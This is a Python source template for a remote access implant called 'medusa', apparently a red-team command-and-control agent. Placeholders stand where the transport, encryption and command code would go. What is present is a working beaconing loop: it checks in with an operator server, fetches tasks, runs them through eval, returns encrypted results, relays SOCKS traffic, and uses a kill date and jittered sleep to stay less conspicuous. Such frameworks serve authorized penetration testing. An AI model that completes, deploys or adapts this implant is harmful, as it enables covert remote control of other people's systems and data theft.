import os, random, sys, json, socket, base64, time, platform, ssl, getpass
from datetime import datetime
import threading, queue
TRANSPORT_IMPORTS

CHUNK_SIZE = 51200

CRYPTO_HERE

    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]:
            if k in os.environ.keys(): return os.environ[k]

TRANSPORT_CLASS_FIELDS

    def formatMessage(self, data, urlsafe=False):
        uuid_to_use = self.agent_config["UUID"]
        if uuid_to_use == "":
            uuid_to_use = self.agent_config["PayloadUUID"]
        output = base64.b64encode(uuid_to_use.encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe:
            output = base64.urlsafe_b64encode(uuid_to_use.encode() + self.encrypt(json.dumps(data).encode()))
        return output

    def formatResponse(self, data):
        uuid_to_use = self.agent_config["UUID"]
        if uuid_to_use == "":
            uuid_to_use = self.agent_config["PayloadUUID"]
        if isinstance(data, bytes):
            decoded = data.decode()
        else:
            decoded = data
        cleaned = decoded.replace(uuid_to_use, "")
        if not cleaned or cleaned.strip() == "":
            return {}
        return json.loads(cleaned)

TRANSPORT_FUNCTIONS

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)
        if "socks" in response_data:
            for packet in response_data["socks"]: self.socks_in.put(packet)

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]:
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                                  if resp["task_id"] == t["task_id"] \
                                  and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
                if "socks" in response_data:
                    for packet in response_data["socks"]: self.socks_in.put(packet)
        except: pass

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"]
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    def processTaskings(self):
        threads = list()
        taskings = self.taskings
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_HERE

    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "KillDate": "killdate",
            "enc_key": AESPSK,
            "ExchChk": "encrypted_exchange_check",
            "ProxyHost": "proxy_host",
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
TRANSPORT_CONFIG
        }

        while True:
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while True:
                    if self.passedKilldate():
                        self.exit(None)
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()

if __name__ == "__main__":
    medusa = medusa()
